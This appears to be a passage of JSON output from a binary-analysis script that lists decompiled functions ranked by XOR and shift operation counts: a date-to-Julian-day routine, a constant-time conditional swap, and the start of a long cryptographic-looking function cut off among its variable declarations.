[
    {
        "Function": "sub_14004D864",
        "Total XOR and shift operations": 9,
        "XOR operations": 0,
        "Shift operations": 9,
        "Operation percentage": "64.29%",
        "Function Body": "\n__int64 __fastcall sub_14004D864(int a1)\n{\n  return ((unsigned int)(((a1 >> 9) - 1) % 100) >> 31)\n       + (((a1 >> 9) - 1) >> 2)\n       + ((((a1 >> 9) - 1) % 400) >> 31)\n       + (a1 & 0x1FF)\n       + ((a1 >> 9) - 1) / 400\n       + ((a1 >> 9) - 1) / -100\n       + 365 * ((a1 >> 9) - 1)\n       + 1721425;\n}\n\n"
    },
    {
        "Function": "sub_140009557",
        "Total XOR and shift operations": 10,
        "XOR operations": 10,
        "Shift operations": 0,
        "Operation percentage": "58.82%",
        "Function Body": "\n__int64 __fastcall sub_140009557(_QWORD *a1, _QWORD *a2, unsigned __int8 a3)\n{\n  __int64 result; // rax\n  __int64 v4; // r9\n\n  result = -(__int64)a3;\n  v4 = a1[1];\n  *a1 ^= result & (*a1 ^ *a2);\n  a1[1] = v4 ^ result & (v4 ^ a2[1]);\n  a1[2] ^= result & (a1[2] ^ a2[2]);\n  a1[3] ^= result & (a1[3] ^ a2[3]);\n  a1[4] ^= result & (a1[4] ^ a2[4]);\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_140017876",
        "Total XOR and shift operations": 1484,
        "XOR operations": 1420,
        "Shift operations": 64,
        "Operation percentage": "57.43%",
        "Function Body": "\n__int64 __fastcall sub_140017876(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int64 a5, __int128 *a6)\n{\n  __int64 v8; // rax\n  __int64 v9; // rdx\n  __int64 v10; // rax\n  __int64 v11; // rdx\n  __int64 v12; // rax\n  int v13; // r14d\n  __int64 v14; // rax\n  int v15; // edi\n  __int64 v16; // rax\n  int v17; // ebx\n  __int64 v18; // rax\n  int v19; // ebp\n  __int64 v20; // rax\n  int v21; // r15d\n  __int64 v22; // rax\n  int v23; // r12d\n  __int64 v24; // rax\n  int v25; // r13d\n  __int64 v26; // rax\n  int v27; // ecx\n  int v28; // eax\n  int v29; // edi\n  int v30; // ebx\n  int v31; // ebp\n  int v32; // r15d\n  int v33; // r12d\n  int v34; // r13d\n  int v35; // ecx\n  int v36; // r9d\n  int v37; // edx\n  int v38; // r11d\n  int v39; // r8d\n  int v40; // eax\n  int v41; // ebx\n  int v42; // esi\n  int v43; // r10d\n  int v44; // r9d\n  int v45; // r10d\n  int v46; // r11d\n  int v47; // eax\n  int v48; // edi\n  int v49; // ecx\n  int v50; // esi\n  int v51; // ebx\n  int v52; // ebp\n  int v53; // edi\n  int v54; // r9d\n  int v55; // r8d\n  int v56; // r14d\n  int v57; // eax\n  int v58; // esi\n  int v59; // edx\n  int v60; // ecx\n  int v61; // r11d\n  int v62; // r10d\n  int v63; // r9d\n  int v64; // r14d\n  int v65; // edi\n  int v66; // r10d\n  int v67; // esi\n  int v68; // eax\n  int v69; // ecx\n  int v70; // r8d\n  int v71; // r11d\n  int v72; // r14d\n  int v73; // r15d\n  int v74; // edx\n  int v75; // r12d\n  int v76; // r13d\n  int v77; // ebp\n  int v78; // r8d\n  int v79; // ecx\n  int v80; // r11d\n  int v81; // esi\n  int v82; // edx\n  int v83; // r12d\n  int v84; // r9d\n  int v85; // eax\n  int v86; // r8d\n  int v87; // r9d\n  int v88; // r15d\n  int v89; // r10d\n  int v90; // ecx\n  int v91; // edx\n  int v92; // edi\n  int v93; // r11d\n  int v94; // r15d\n  int v95; // ebp\n  int v96; // r9d\n  int v97; // ebx\n  int v98; // ecx\n  int v99; // eax\n  int v100; // edx\n  int v101; // r11d\n  int v102; // r15d\n  int v103; // r10d\n  int v104; // r8d\n  int v105; // r14d\n  int v106; // edx\n  int v107; // esi\n  int v108; // edx\n  int v109; // r11d\n  int v110; // r11d\n  int v111; // r15d\n  int v112; // r12d\n  int v113; // r10d\n  int v114; // edi\n  int v115; // r8d\n  int v116; // edx\n  int v117; // r9d\n  int v118; // r14d\n  int v119; // r11d\n  int v120; // r15d\n  int v121; // eax\n  int v122; // esi\n  int v123; // ecx\n  int v124; // edi\n  int v125; // edx\n  int v126; // ebx\n  int v127; // eax\n  int v128; // r8d\n  int v129; // r9d\n  int v130; // ebp\n  int v131; // r10d\n  int v132; // r12d\n  int v133; // eax\n  int v134; // ecx\n  int v135; // edx\n  int v136; // r13d\n  int v137; // r12d\n  int v138; // ebx\n  int v139; // ecx\n  int v140; // edx\n  int v141; // eax\n  int v142; // r14d\n  int v143; // esi\n  int v144; // edi\n  int v145; // ebp\n  int v146; // r9d\n  int v147; // r15d\n  int v148; // r10d\n  int v149; // eax\n  int v150; // ebx\n  int v151; // r15d\n  int v152; // r15d\n  int v153; // esi\n  int v154; // ebx\n  int v155; // r9d\n  int v156; // r11d\n  int v157; // eax\n  int v158; // r8d\n  int v159; // r11d\n  int v160; // esi\n  int v161; // r11d\n  int v162; // r9d\n  int v163; // r10d\n  int v164; // r9d\n  int v165; // eax\n  int v166; // ecx\n  int v167; // r8d\n  int v168; // r9d\n  int v169; // r10d\n  int v170; // edx\n  int v171; // ecx\n  int v172; // ecx\n  int v173; // ebp\n  int v174; // ebp\n  int v175; // edi\n  int v176; // ecx\n  int v177; // r15d\n  int v178; // eax\n  int v179; // ecx\n  int v180; // edx\n  int v181; // eax\n  int v182; // edx\n  int v183; // edx\n  int v184; // r10d\n  int v185; // eax\n  int v186; // r12d\n  int v187; // edx\n  int v188; // eax\n  int v189; // r8d\n  int v190; // r8d\n  int v191; // eax\n  int v192; // ecx\n  int v193; // ecx\n  int v194; // r10d\n  int v195; // eax\n  int v196; // ecx\n  int v197; // r9d\n  int v198; // ecx\n  int v199; // ecx\n  int v200; // r9d\n  int v201; // edx\n  int v202; // eax\n  int v203; // edx\n  int v204; // ecx\n  int v205; // eax\n  int v206; // ecx\n  int v207; // ecx\n  int v208; // r9d\n  int v209; // eax\n  int v210; // edx\n  int v211; // eax\n  int v212; // r8d\n  int v213; // r9d\n  int v214; // ecx\n  int v215; // r14d\n  int v216; // ecx\n  int v217; // r9d\n  int v218; // eax\n  int v219; // ecx\n  int v220; // r10d\n  int v221; // ecx\n  int v222; // ecx\n  int v223; // r9d\n  int v224; // ecx\n  int v225; // eax\n  int v226; // edx\n  int v227; // ecx\n  int v228; // eax\n  int v229; // ecx\n  int v230; // r8d\n  int v231; // edi\n  int v232; // r15d\n  int v233; // ecx\n  int v234; // edx\n  int v235; // r8d\n  int v236; // ecx\n  int v237; // edx\n  int v238; // edx\n  int v239; // esi\n  int v240; // r11d\n  int v241; // ebp\n  int v242; // esi\n  int v243; // r10d\n  int v244; // ebx\n  int v245; // eax\n  int v246; // ebx\n  int v247; // edi\n  __int64 v248; // rax\n  int v249; // r15d\n  __int64 v250; // rax\n  int v251; // r14d\n  __int64 v252; // rax\n  int v253; // ebp\n  __int64 v254; // rax\n  int v255; // r15d\n  int v256; // r14d\n  int v257; // eax\n  int v258; // edx\n  int v259; // ecx\n  int v260; // ebp\n  int v261; // r14d\n  int v262; // eax\n  int v263; // r14d\n  int v264; // edx\n  int v265; // ebp\n  int v266; // r14d\n  int v267; // ecx\n  int v268; // edx\n  int v269; // ecx\n  int v270; // ebp\n  int v271; // edx\n  int v272; // eax\n  int v273; // ecx\n  int v274; // r8d\n  int v275; // edx\n  int v276; // eax\n  int v277; // ecx\n  int v278; // r8d\n  int v279; // r9d\n  int v280; // eax\n  int v281; // edx\n  int v282; // r9d\n  int v283; // ecx\n  int v284; // edx\n  int v285; // r8d\n  int v286; // r9d\n  int v287; // eax\n  int v288; // edx\n  int v289; // r9d\n  int v290; // r8d\n  int v291; // ecx\n  int v292; // edx\n  int v293; // eax\n  int v294; // r8d\n  int v295; // ecx\n  int v296; // eax\n  int v297; // edx\n  int v298; // r9d\n  int v299; // edx\n  int v300; // eax\n  int v301; // r8d\n  int v302; // ecx\n  int v303; // r9d\n  int v304; // eax\n  int v305; // edx\n  int v306; // ecx\n  int v307; // r8d\n  int v308; // r9d\n  int v309; // eax\n  int v310; // ecx\n  int v311; // r9d\n  int v312; // r8d\n  int v313; // edx\n  int v314; // r8d\n  int v315; // ecx\n  int v316; // eax\n  int v317; // r9d\n  int v318; // r10d\n  int v319; // edx\n  int v320; // ecx\n  int v321; // r8d\n  int v322; // r10d\n  int v323; // ecx\n  int v324; // eax\n  int v325; // r8d\n  int v326; // r11d\n  int v327; // edx\n  int v328; // eax\n  int v329; // r9d\n  int v330; // eax\n  int v331; // ecx\n  int v332; // edx\n  int v333; // r8d\n  int v334; // edx\n  int v335; // r10d\n  int v336; // r9d\n  int v337; // ecx\n  int v338; // r9d\n  int v339; // r10d\n  int v340; // r11d\n  int v341; // edx\n  int v342; // r8d\n  int v343; // eax\n  int v344; // edx\n  int v345; // ecx\n  int v346; // r8d\n  int v347; // eax\n  int v348; // edx\n  int v349; // r10d\n  int v350; // ecx\n  int v351; // r9d\n  int v352; // ecx\n  int v353; // eax\n  int v354; // r8d\n  int v355; // eax\n  int v356; // ecx\n  int v357; // edx\n  int v358; // r8d\n  int v359; // edx\n  int v360; // r9d\n  int v361; // r11d\n  int v362; // ecx\n  int v363; // r9d\n  int v364; // r8d\n  int v365; // r10d\n  int v366; // r9d\n  int v367; // edx\n  int v368; // r8d\n  int v369; // r11d\n  int v370; // ecx\n  int v371; // esi\n  int v372; // r8d\n  int v373; // esi\n  int v374; // eax\n  int v375; // r11d\n  int v376; // eax\n  int v377; // esi\n  int v378; // r11d\n  int v379; // ecx\n  int v380; // edx\n  int v381; // eax\n  int v382; // r8d\n  int v383; // ecx\n  int v384; // r8d\n  int v385; // edx\n  int v386; // r11d\n  int v387; // r9d\n  int v388; // eax\n  int v389; // r8d\n  int v390; // edx\n  int v391; // r8d\n  int v392; // r11d\n  int v393; // eax\n  int v394; // r11d\n  int v395; // r9d\n  int v396; // r11d\n  int v397; // r8d\n  int v398; // eax\n  int v399; // r10d\n  int v400; // r9d\n  int v401; // r8d\n  int v402; // eax\n  int v403; // edx\n  int v404; // r11d\n  int v405; // r10d\n  int v406; // r8d\n  int v407; // eax\n  int v408; // r8d\n  int v409; // edx\n  int v410; // ecx\n  int v411; // edx\n  int v412; // r10d\n  int v413; // ecx\n  int v414; // eax\n  int v415; // edx\n  int v416; // r8d\n  int v417; // ecx\n  int v418; // eax\n  int v419; // edx\n  int v420; // r8d\n  int v421; // r9d\n  int v422; // eax\n  int v423; // ecx\n  int v424; // r9d\n  int v425; // edx\n  int v426; // ecx\n  int v427; // r8d\n  int v428; // r9d\n  int v429; // eax\n  int v430; // ecx\n  int v431; // edx\n  int v432; // r8d\n  int v433; // edx\n  int v434; // ecx\n  int v435; // eax\n  int v436; // r8d\n  int v437; // edx\n  int v438; // eax\n  int v439; // ecx\n  int v440; // r9d\n  int v441; // ecx\n  int v442; // eax\n  int v443; // r8d\n  int v444; // edx\n  int v445; // r9d\n  int v446; // eax\n  int v447; // ecx\n  int v448; // edx\n  int v449; // r8d\n  int v450; // r9d\n  int v451; // eax\n  int v452; // edx\n  int v453; // r9d\n  int v454; // r8d\n  int v455; // r10d\n  int v456; // r8d\n  int v457; // edx\n  int v458; // eax\n  int v459; // r9d\n  int v460; // ecx\n  int v461; // r10d\n  int v462; // edx\n  int v463; // r8d\n  int v464; // ecx\n  int v465; // edx\n  unsigned int v466; // eax\n  int v467; // r8d\n  int v468; // ebx\n  int v469; // ecx\n  int v470; // r11d\n  int v471; // r10d\n  int v472; // r11d\n  int v473; // esi\n  int v474; // ecx\n  int v475; // ebp\n  int v476; // r10d\n  int v477; // edi\n  int v478; // r10d\n  int v479; // ebp\n  int v480; // r14d\n  int v481; // ecx\n  int v482; // esi\n  int v483; // ecx\n  int v484; // r11d\n  int v485; // ecx\n  int v486; // r10d\n  int v487; // r11d\n  int v488; // esi\n  int v489; // ecx\n  int v490; // edi\n  int v491; // r10d\n  int v492; // ebp\n  int v493; // r10d\n  int v494; // esi\n  int v495; // r11d\n  int v496; // esi\n  int v497; // r10d\n  int v498; // ecx\n  int v499; // r11d\n  int v500; // esi\n  int v501; // r14d\n  int v502; // r10d\n  int v503; // esi\n  int v504; // r11d\n  int v505; // ebp\n  int v506; // esi\n  int v507; // edi\n  int v508; // r11d\n  int v509; // r14d\n  int v510; // r10d\n  int v511; // r15d\n  int v512; // r11d\n  int v513; // r15d\n  int v514; // ecx\n  int v515; // r14d\n  int v516; // ecx\n  int v517; // r15d\n  int v518; // r14d\n  int v519; // r10d\n  int v520; // edi\n  int v521; // ecx\n  int v522; // esi\n  int v523; // r10d\n  int v524; // esi\n  int v525; // edi\n  int v526; // r14d\n  int v527; // r11d\n  int v528; // ecx\n  int v529; // esi\n  int v530; // edi\n  int v531; // esi\n  int v532; // r14d\n  int v533; // ecx\n  int v534; // r14d\n  int v535; // r11d\n  int v536; // r14d\n  int v537; // esi\n  int v538; // ecx\n  int v539; // ebp\n  int v540; // r11d\n  int v541; // esi\n  int v542; // ecx\n  int v543; // r10d\n  int v544; // edi\n  int v545; // ebp\n  int v546; // esi\n  int v547; // ecx\n  int v548; // esi\n  int v549; // r10d\n  int v550; // r11d\n  int v551; // r10d\n  int v552; // ebp\n  int v553; // r11d\n  int v554; // ecx\n  int v555; // r10d\n  int v556; // edi\n  int v557; // r11d\n  int v558; // ecx\n  int v559; // r10d\n  int v560; // edi\n  int v561; // esi\n  int v562; // ecx\n  int v563; // r11d\n  int v564; // esi\n  int v565; // r10d\n  int v566; // r11d\n  int v567; // edi\n  int v568; // esi\n  int v569; // ecx\n  int v570; // r11d\n  int v571; // esi\n  int v572; // edi\n  unsigned int v573; // r10d\n  unsigned int v574; // r11d\n  unsigned int v575; // edi\n  unsigned int v576; // ecx\n  __m128i v577; // xmm0\n  __m128i v578; // xmm1\n  int v579; // edi\n  int v580; // ecx\n  int v581; // r15d\n  int v582; // ebp\n  int v583; // ecx\n  int v584; // edi\n  int v585; // esi\n  int v586; // r15d\n  int v587; // ecx\n  int v588; // ebp\n  int v589; // esi\n  int v590; // r14d\n  int v591; // edi\n  int v592; // ecx\n  int v593; // esi\n  int v594; // edi\n  int v595; // r14d\n  int v596; // r15d\n  int v597; // r14d\n  int v598; // esi\n  int v599; // ecx\n  int v600; // edi\n  int v601; // ebp\n  int v602; // r15d\n  int v603; // esi\n  int v604; // r14d\n  int v605; // ebp\n  int v606; // esi\n  int v607; // ecx\n  int v608; // r14d\n  int v609; // r15d\n  int v610; // edi\n  int v611; // ecx\n  int v612; // ebp\n  int v613; // ecx\n  int v614; // esi\n  int v615; // edi\n  int v616; // r14d\n  int v617; // edi\n  int v618; // r15d\n  int v619; // ebp\n  int v620; // esi\n  int v621; // ebp\n  int v622; // r15d\n  int v623; // r12d\n  int v624; // edi\n  int v625; // r14d\n  int v626; // ecx\n  int v627; // edi\n  int v628; // esi\n  int v629; // ecx\n  int v630; // r14d\n  int v631; // edi\n  int v632; // r15d\n  int v633; // esi\n  int v634; // r14d\n  int v635; // esi\n  int v636; // ebp\n  int v637; // ecx\n  int v638; // ebp\n  int v639; // esi\n  int v640; // edi\n  int v641; // ecx\n  int v642; // ebp\n  int v643; // r14d\n  int v644; // esi\n  int v645; // ebp\n  int v646; // ecx\n  int v647; // r15d\n  int v648; // ebp\n  int v649; // edi\n  int v650; // ecx\n  int v651; // r12d\n  int v652; // esi\n  int v653; // r13d\n  int v654; // ecx\n  int v655; // r13d\n  int v656; // r14d\n  int v657; // r12d\n  int v658; // r14d\n  int v659; // r13d\n  int v660; // r12d\n  int v661; // esi\n  int v662; // edi\n  int v663; // r14d\n  int v664; // ebp\n  int v665; // esi\n  int v666; // ebp\n  int v667; // edi\n  int v668; // ecx\n  int v669; // r15d\n  int v670; // r14d\n  int v671; // ebp\n  int v672; // edi\n  int v673; // ebp\n  int v674; // ecx\n  int v675; // r14d\n  int v676; // ecx\n  int v677; // r15d\n  int v678; // ecx\n  int v679; // ebp\n  int v680; // r14d\n  int v681; // r12d\n  unsigned __int64 v682; // xmm0_8\n  int v683; // r15d\n  int v684; // ebp\n  int v685; // r12d\n  int v686; // r14d\n  __int128 *v687; // rsi\n  __int64 v688; // rcx\n  char *v689; // rdi\n  __int64 v690; // rbx\n  __int64 v691; // r14\n  unsigned __int64 v692; // rbx\n  __int64 v693; // r12\n  __int64 v694; // rdx\n  __int64 v695; // rdi\n  __int64 v696; // rdx\n  __int64 v697; // r8\n  char v698; // dl\n  __int64 v699; // rcx\n  int v700; // edi\n  int v701; // r10d\n  unsigned int v702; // r15d\n  int v703; // r9d\n  int v704; // r11d\n  int v705; // edi\n  int v706; // r11d\n  int v707; // r10d\n  int v708; // ebp\n  int v709; // edi\n  unsigned int v710; // ebx\n  int v711; // ebp\n  int v712; // r11d\n  int v713; // r13d\n  int v714; // edi\n  unsigned int v715; // ebp\n  unsigned int v716; // esi\n  int v717; // r13d\n  int v718; // r14d\n  int v719; // r12d\n  int v720; // r14d\n  int v721; // r11d\n  int v722; // r9d\n  int v723; // r10d\n  int v724; // r12d\n  unsigned int v725; // ecx\n  unsigned int v726; // r14d\n  int v727; // r12d\n  __int64 v728; // rax\n  __int64 v729; // rdx\n  int v730; // ecx\n  int v731; // edi\n  int v732; // r11d\n  int v733; // eax\n  int v734; // edx\n  int v735; // edi\n  unsigned int v736; // r14d\n  int v737; // ecx\n  int v738; // r8d\n  int v739; // edi\n  int v740; // edx\n  int v741; // r13d\n  int v742; // r12d\n  int v743; // edi\n  int v744; // r8d\n  int v745; // r9d\n  int v746; // edx\n  int v747; // r8d\n  int v748; // eax\n  int v749; // ecx\n  int v750; // r9d\n  __int64 v751; // rax\n  __int64 v752; // rdx\n  int v753; // ecx\n  int v754; // edi\n  int v755; // edx\n  int v756; // r12d\n  int v757; // r8d\n  int v758; // eax\n  int v759; // edx\n  int v760; // edi\n  int v761; // r13d\n  int v762; // ecx\n  int v763; // r8d\n  int v764; // edi\n  int v765; // r11d\n  int v766; // edx\n  int v767; // r12d\n  int v768; // edi\n  int v769; // r12d\n  int v770; // r13d\n  int v771; // edi\n  int v772; // r8d\n  int v773; // r9d\n  int v774; // edx\n  int v775; // r8d\n  int v776; // eax\n  int v777; // ecx\n  int v778; // r9d\n  int v779; // r13d\n  int v780; // ebx\n  __int64 v781; // rax\n  __int64 v782; // rdx\n  int v783; // ecx\n  int v784; // edi\n  int v785; // ebx\n  int v786; // esi\n  int v787; // edx\n  int v788; // edi\n  int v789; // r12d\n  int v790; // ecx\n  int v791; // r8d\n  int v792; // edi\n  int v793; // ebx\n  int v794; // edx\n  int v795; // r13d\n  int v796; // edi\n  int v797; // r8d\n  int v798; // r9d\n  int v799; // edx\n  int v800; // r8d\n  int v801; // esi\n  int v802; // ecx\n  int v803; // r9d\n  int v804; // r13d\n  __int64 v805; // rax\n  __int64 v806; // rdx\n  int v807; // edi\n  int v808; // ebx\n  int v809; // r12d\n  int v810; // edx\n  int v811; // edi\n  int v812; // edx\n  int v813; // r14d\n  int v814; // r9d\n  int v815; // r10d\n  int v816; // edi\n  int v817; // r10d\n  int v818; // r8d\n  unsigned int v819; // edi\n  int v820; // r8d\n  unsigned int v821; // r10d\n  int v822; // r9d\n  int v823; // esi\n  int v824; // ebp\n  int v825; // r12d\n  int v826; // eax\n  unsigned int v827; // r15d\n  int v828; // edx\n  int v829; // r8d\n  int v830; // eax\n  int v831; // r12d\n  int v832; // r9d\n  int v833; // edx\n  __int64 v834; // rax\n  __int64 v835; // rdx\n  unsigned int v836; // eax\n  char v837; // dl\n  __int128 v838; // rax\n  __int64 v839; // rsi\n  __int64 v840; // rdx\n  __int64 v841; // rdi\n  __int64 v842; // rax\n  __int64 v843; // rcx\n  __int64 i; // rdx\n  __int64 result; // rax\n  _OWORD *v846; // rcx\n  const char *v847; // rcx\n  void **v848; // r8\n  __int64 v849; // rdx\n  int v850; // [rsp+2Ch] [rbp-157Ch]\n  int v851; // [rsp+2Ch] [rbp-157Ch]\n  int v852; // [rsp+2Ch] [rbp-157Ch]\n  char v853; // [rsp+2Ch] [rbp-157Ch]\n  int v854; // [rsp+30h] [rbp-1578h]\n  int v855; // [rsp+30h] [rbp-1578h]\n  int v856; // [rsp+30h] [rbp-1578h]\n  int v857; // [rsp+34h] [rbp-1574h]\n  int v858; // [rsp+34h] [rbp-1574h]\n  int v859; // [rsp+38h] [rbp-1570h]\n  int v860; // [rsp+38h] [rbp-1570h]\n  int v861; // [rsp+38h] [rbp-1570h]\n  unsigned int v862; // [rsp+38h] [rbp-1570h]\n  unsigned int v863; // [rsp+38h] [rbp-1570h]\n  int v864; // [rsp+40h] [rbp-1568h]\n  int v865; // [rsp+40h] [rbp-1568h]\n  int v866; // [rsp+40h] [rbp-1568h]\n  unsigned int v867; // [rsp+40h] [rbp-1568h]\n  int v868; // [rsp+48h] [rbp-1560h]\n  int v869; // [rsp+48h] [rbp-1560h]\n  int v870; // [rsp+48h] [rbp-1560h]\n  unsigned int v871; // [rsp+48h] [rbp-1560h]\n  int v872; // [rsp+48h] [rbp-1560h]\n  int v873; // [rsp+50h] [rbp-1558h]\n  int v874; // [rsp+50h] [rbp-1558h]\n  unsigned int v875; // [rsp+50h] [rbp-1558h]\n  unsigned int v876; // [rsp+50h] [rbp-1558h]\n  int v877; // [rsp+58h] [rbp-1550h]\n  int v878; // [rsp+58h] [rbp-1550h]\n  int v879; // [rsp+5Ch] [rbp-154Ch]\n  int v880; // [rsp+5Ch] [rbp-154Ch]\n  int v881; // [rsp+5Ch] [rbp-154Ch]\n  int v882; // [rsp+60h] [rbp-1548h]\n  int v883; // [rsp+60h] [rbp-1548h]\n  int v884; // [rsp+64h] [rbp-1544h]\n  int v885; // [rsp+64h] [rbp-1544h]\n  int v886; // [rsp+64h] [rbp-1544h]\n  int v887; // [rsp+68h] [rbp-1540h]\n  int v888; // [rsp+68h] [rbp-1540h]\n  int v889; // [rsp+68h] [rbp-1540h]\n  int v890; // [rsp+6Ch] [rbp-153Ch]\n  int v891; // [rsp+6Ch] [rbp-153Ch]\n  int v892; // [rsp+6Ch] [rbp-153Ch]\n  int v893; // [rsp+70h] [rbp-1538h]\n  int v894; // [rsp+70h] [rbp-1538h]\n  unsigned int v895; // [rsp+70h] [rbp-1538h]\n  unsigned int v896; // [rsp+70h] [rbp-1538h]\n  int v897; // [rsp+78h] [rbp-1530h]\n  int v898; // [rsp+78h] [rbp-1530h]\n  unsigned int v899; // [rsp+78h] [rbp-1530h]\n  int v900; // [rsp+78h] [rbp-1530h]\n  int v901; // [rsp+80h] [rbp-1528h]\n  int v902; // [rsp+80h] [rbp-1528h]\n  unsigned int v903; // [rsp+80h] [rbp-1528h]\n  unsigned int v904; // [rsp+80h] [rbp-1528h]\n  int v905; // [rsp+8Ch] [rbp-151Ch]\n  int v906; // [rsp+8Ch] [rbp-151Ch]\n  int v907; // [rsp+90h] [rbp-1518h]\n  int v908; // [rsp+90h] [rbp-1518h]\n  int v909; // [rsp+94h] [rbp-1514h]\n  int v910; // [rsp+94h] [rbp-1514h]\n  int v911; // [rsp+94h] [rbp-1514h]\n  int v912; // [rsp+98h] [rbp-1510h]\n  int v913; // [rsp+98h] [rbp-1510h]\n  int v914; // [rsp+98h] [rbp-1510h]\n  int v915; // [rsp+9Ch] [rbp-150Ch]\n  int v916; // [rsp+9Ch] [rbp-150Ch]\n  int v917; // [rsp+9Ch] [rbp-150Ch]\n  int v918; // [rsp+A0h] [rbp-1508h]\n  int v919; // [rsp+A0h] [rbp-1508h]\n  unsigned int v920; // [rsp+A0h] [rbp-1508h]\n  unsigned int v921; // [rsp+A0h] [rbp-1508h]\n  int v922; // [rsp+A8h] [rbp-1500h]\n  int v923; // [rsp+A8h] [rbp-1500h]\n  int v924; // [rsp+A8h] [rbp-1500h]\n  unsigned int v925; // [rsp+A8h] [rbp-1500h]\n  int v926; // [rsp+B0h] [rbp-14F8h]\n  int v927; // [rsp+B0h] [rbp-14F8h]\n  int v928; // [rsp+B4h] [rbp-14F4h]\n  int v929; // [rsp+B4h] [rbp-14F4h]\n  int v930; // [rsp+B8h] [rbp-14F0h]\n  int v931; // [rsp+B8h] [rbp-14F0h]\n  int v932; // [rsp+BCh] [rbp-14ECh]\n  int v933; // [rsp+BCh] [rbp-14ECh]\n  int v934; // [rsp+C0h] [rbp-14E8h]\n  int v935; // [rsp+C0h] [rbp-14E8h]\n  int v936; // [rsp+C4h] [rbp-14E4h]\n  int v937; // [rsp+C4h] [rbp-14E4h]\n  int v938; // [rsp+C8h] [rbp-14E0h]\n  int v939; // [rsp+C8h] [rbp-14E0h]\n  int v940; // [rsp+CCh] [rbp-14DCh]\n  int v941; // [rsp+CCh] [rbp-14DCh]\n  int v942; // [rsp+D0h] [rbp-14D8h]\n  int v943; // [rsp+D0h] [rbp-14D8h]\n  int v944; // [rsp+D4h] [rbp-14D4h]\n  int v945; // [rsp+D4h] [rbp-14D4h]\n  int v946; // [rsp+D8h] [rbp-14D0h]\n  int v947; // [rsp+D8h] [rbp-14D0h]\n  int v948; // [rsp+DCh] [rbp-14CCh]\n  int v949; // [rsp+DCh] [rbp-14CCh]\n  int v950; // [rsp+E0h] [rbp-14C8h]\n  int v951; // [rsp+E0h] [rbp-14C8h]\n  int v952; // [rsp+E4h] [rbp-14C4h]\n  int v953; // [rsp+E4h] [rbp-14C4h]\n  int v954; // [rsp+E8h] [rbp-14C0h]\n  int v955; // [rsp+E8h] [rbp-14C0h]\n  int v956; // [rsp+ECh] [rbp-14BCh]\n  int v957; // [rsp+ECh] [rbp-14BCh]\n  int v958; // [rsp+F0h] [rbp-14B8h]\n  int v959; // [rsp+F0h] [rbp-14B8h]\n  int v960; // [rsp+F4h] [rbp-14B4h]\n  int v961; // [rsp+F4h] [rbp-14B4h]\n  int v962; // [rsp+F8h] [rbp-14B0h]\n  int v963; // [rsp+F8h] [rbp-14B0h]\n  int v964; // [rsp+FCh] [rbp-14ACh]\n  int v965; // [rsp+FCh] [rbp-14ACh]\n  int v966; // [rsp+100h] [rbp-14A8h]\n  int v967; // [rsp+100h] [rbp-14A8h]\n  int v968; // [rsp+104h] [rbp-14A4h]\n  int v969; // [rsp+104h] [rbp-14A4h]\n  int v970; // [rsp+108h] [rbp-14A0h]\n  int v971; // [rsp+108h] [rbp-14A0h]\n  int v972; // [rsp+10Ch] [rbp-149Ch]\n  int v973; // [rsp+10Ch] [rbp-149Ch]\n  int v974; // [rsp+110h] [rbp-1498h]\n  int v975; // [rsp+110h] [rbp-1498h]\n  int v976; // [rsp+114h] [rbp-1494h]\n  int v977; // [rsp+114h] [rbp-1494h]\n  int v978; // [rsp+118h] [rbp-1490h]\n  int v979; // [rsp+118h] [rbp-1490h]\n  int v980; // [rsp+11Ch] [rbp-148Ch]\n  int v981; // [rsp+11Ch] [rbp-148Ch]\n  int v982; // [rsp+120h] [rbp-1488h]\n  int v983; // [rsp+120h] [rbp-1488h]\n  int v984; // [rsp+124h] [rbp-1484h]\n  int v985; // [rsp+124h] [rbp-1484h]\n  int v986; // [rsp+128h] [rbp-1480h]\n  int v987; // [rsp+128h] [rbp-1480h]\n  int v988; // [rsp+12Ch] [rbp-147Ch]\n  int v989; // [rsp+12Ch] [rbp-147Ch]\n  int v990; // [rsp+130h] [rbp-1478h]\n  int v991; // [rsp+130h] [rbp-1478h]\n  int v992; // [rsp+134h] [rbp-1474h]\n  int v993; // [rsp+134h] [rbp-1474h]\n  int v994; // [rsp+138h] [rbp-1470h]\n  int v995; // [rsp+138h] [rbp-1470h]\n  int v996; // [rsp+13Ch] [rbp-146Ch]\n  int v997; // [rsp+13Ch] [rbp-146Ch]\n  int v998; // [rsp+140h] [rbp-1468h]\n  int v999; // [rsp+140h] [rbp-1468h]\n  int v1000; // [rsp+144h] [rbp-1464h]\n  int v1001; // [rsp+144h] [rbp-1464h]\n  int v1002; // [rsp+148h] [rbp-1460h]\n  int v1003; // [rsp+148h] [rbp-1460h]\n  int v1004; // [rsp+14Ch] [rbp-145Ch]\n  int v1005; // [rsp+14Ch] [rbp-145Ch]\n  int v1006; // [rsp+150h] [rbp-1458h]\n  int v1007; // [rsp+150h] [rbp-1458h]\n  int v1008; // [rsp+154h] [rbp-1454h]\n  int v1009; // [rsp+154h] [rbp-1454h]\n  int v1010; // [rsp+158h] [rbp-1450h]\n  int v1011; // [rsp+158h] [rbp-1450h]\n  int v1012; // [rsp+15Ch] [rbp-144Ch]\n  int v1013; // [rsp+15Ch] [rbp-144Ch]\n  int v1014; // [rsp+160h] [rbp-1448h]\n  int v1015; // [rsp+160h] [rbp-1448h]\n  int v1016; // [rsp+164h] [rbp-1444h]\n  int v1017; // [rsp+164h] [rbp-1444h]\n  int v1018; // [rsp+168h] [rbp-1440h]\n  int v1019; // [rsp+168h] [rbp-1440h]\n  int v1020; // [rsp+16Ch] [rbp-143Ch]\n  int v1021; // [rsp+16Ch] [rbp-143Ch]\n  int v1022; // [rsp+170h] [rbp-1438h]\n  int v1023; // [rsp+170h] [rbp-1438h]\n  int v1024; // [rsp+170h] [rbp-1438h]\n  unsigned int v1025; // [rsp+170h] [rbp-1438h]\n  int v1026; // [rsp+178h] [rbp-1430h]\n  int v1027; // [rsp+178h] [rbp-1430h]\n  int v1028; // [rsp+178h] [rbp-1430h]\n  __int64 v1029; // [rsp+178h] [rbp-1430h]\n  int v1030; // [rsp+180h] [rbp-1428h]\n  int v1031; // [rsp+180h] [rbp-1428h]\n  unsigned int v1032; // [rsp+180h] [rbp-1428h]\n  int v1033; // [rsp+188h] [rbp-1420h]\n  int v1034; // [rsp+188h] [rbp-1420h]\n  int v1035; // [rsp+188h] [rbp-1420h]\n  __int64 v1036; // [rsp+188h] [rbp-1420h]\n  int v1037; // [rsp+194h] [rbp-1414h]\n  int v1038; // [rsp+194h] 